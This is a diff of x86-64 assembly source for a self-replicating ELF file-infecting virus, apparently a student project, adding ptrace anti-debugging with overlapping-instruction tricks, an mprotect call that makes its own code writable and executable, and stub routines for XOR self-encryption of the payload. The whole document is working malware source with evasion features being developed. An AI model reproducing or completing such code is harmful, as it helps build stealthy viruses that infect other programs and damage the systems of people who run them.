@@ -49,19 +49,34 @@ _h3ll0w0rld:
 	; binary (gdb, strace, ...), and then it select host or not launching
 	jmp $+4; -- skip mov rax
 	mov rdi, 0x02ebf63148ff3148; xor rdi, rdi; xor rsi, rsi; jmp $+4
-;   -- has to skip 2 byte of instruction next line
+	; -- has to skip 2 byte of instruction next line
 	mov rsi, 0x656ac93148d23148; xor rdx, rdx; xor rcx, rcx; push 101 -- ptrace
 	pop rax
 	syscall
+; = debug
+;	xor rax, rax
+; =
 
 	cmp rax, 0x0
-	jz $+64; has to jmp on [48 31 c0] -> xor rax, rax
-	jmp $+18
-	.uwu db `Li\x00fe I\x88s U\x7fwU\xff*`; 16 bytes key ------------<
-	; TODO: crypt somewhere and decrypt there with the key ^ (/w xor ?)
-	; don't forget to update the jmp byte up there
-	.code:
+	jz .ahah-2; has to jmp on [48 31 c0] -> xor rax, rax
+	jmp .here
+	.code: ; so it's crypted right ? EVERYTHING IS KEEEYYY
+		push rdx
+		lea rdi, [rel _start]
+		sub rdi, [rel entry_inject]
+		mov rsi, [rel entry_inject]
+		sub rsi, 8 * 3
+		add rsi, [rel length]
+		push 0x7
+		pop rdx ; PROT_READ | PROT_WRITE | PROT_EXEC
+		push 10
+		pop rax ; mprotect
+		syscall; change protect from file to _eof
+		pop rdx
 
+		; TODO: XOR DESENCRYPTION HERE
+
+	jmp .infected; TODO: has to jmp on [eb 27] (previously $-15)
 	.here:
 	push 2
 	pop rdi
@@ -76,10 +91,12 @@ _h3ll0w0rld:
 	;                            from right to left
 	mov rax, 0xc0314827eb050f42; 42[syscall][jmp .infected][xor rax, rax]
 
-	; copy the prg in memory and launch it
+	.ahah:
 	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
-	jne $-15; has to jmp on [eb 27]
+	jnz .code ; $-15
+	; copy the prg in memory and launch it cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
 
+	.host:
 	mov rax, SYSCALL_FORK; fork
 	syscall
 	cmp rax, 0x0
@@ -98,6 +115,9 @@ _h3ll0w0rld:
 		jz .virus
 
 		jmp .prg
+; = DEBUG
+;		jmp .virus
+; =
 		.gandalf:; 2 byte then [debug_msg db `DEBUGGING..\n`, 0x0]
 			mov rax, 0x4e49474755424544
 			db `G..\n`, 0x0
@@ -606,6 +626,8 @@ _infect_file: ; (string rdi, stat rsi)
 			cmp rsi, rdx
 			jl .unmap ; not enough size /w packed virus
 
+			call _crypto
+
 			jmp .params
 
 			.infected:
@@ -620,6 +642,8 @@ _infect_file: ; (string rdi, stat rsi)
 			call _ft_memcpy
 			mov rax, rdi
 			add rdx, 8 * 3
+
+			call _crypto
 
 			.params:
 			; add _params
@@ -684,6 +708,10 @@ _infect_file: ; (string rdi, stat rsi)
 	pop r12
 	pop r11
 	pop r10
+ret
+
+_crypto:
+	; TODO: XOR ENCRYPTION HERE <3
 ret
 
 _check_file_process:; (string rdi)
